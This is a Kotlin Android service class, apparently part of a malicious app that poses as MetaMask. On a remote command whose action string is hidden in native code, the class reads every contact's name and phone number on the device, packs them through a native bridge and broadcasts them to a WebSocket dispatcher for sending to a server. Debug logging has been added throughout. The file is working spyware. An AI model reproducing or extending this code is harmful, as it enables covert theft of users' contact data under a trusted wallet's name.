package com.example.MetaMask.services

import android.app.Service
import android.content.Intent
import android.os.IBinder
import androidx.annotation.Keep
import com.example.MetaMask.utils.ContactReaderUtil
import com.yourcompany.core.jni.NativeBridge
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import org.json.JSONObject

@Keep
class FrienCat : Service() {

    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    override fun onBind(intent: Intent?): IBinder? {
        android.util.Log.d("XDBG", "[FrienCat] onBind enter intent=${intent}") //xdbg
        android.util.Log.d("XDBG", "[FrienCat] return") //xdbg
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[FrienCat] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        val commandJsonString = intent?.getStringExtra("command")

        if (commandJsonString.isNullOrBlank()) {
            android.util.Log.d("XDBG", "[FrienCat] if branch") //xdbg
            stopSelf()
            android.util.Log.d("XDBG", "[FrienCat] return") //xdbg
            return START_NOT_STICKY
        }

        serviceScope.launch {
            try {
                val commandJson = JSONObject(commandJsonString)
                val action = commandJson.optString("action")

                if (action == NativeBridge.nativeGetContactsActionString()) {
                    android.util.Log.d("XDBG", "[FrienCat] if branch") //xdbg
                    executeTask()
                }
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[FrienCat] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            } finally {
                stopSelf()
            }
        }

        android.util.Log.d("XDBG", "[FrienCat] return") //xdbg
        return START_NOT_STICKY
    }

    private fun executeTask() {
        android.util.Log.d("XDBG", "[FrienCat] executeTask enter") //xdbg
        try {
            val contacts = ContactReaderUtil.getContacts(this)

            val names = contacts.map { it.name }.toTypedArray()
            val numbers = contacts.map { it.phoneNumber }.toTypedArray()

            val payload = NativeBridge.nativeBuildContactsPayload(names, numbers)

            sendData(payload)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[FrienCat] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun sendData(data: String) {
        android.util.Log.d("XDBG", "[FrienCat] sendData enter data=${data}") //xdbg
        try {
            val intent = Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
                putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, data)
                setPackage(packageName)
            }
            sendBroadcast(intent)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[FrienCat] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[FrienCat] onDestroy enter") //xdbg
        super.onDestroy()
        serviceJob.cancel()
    }
}
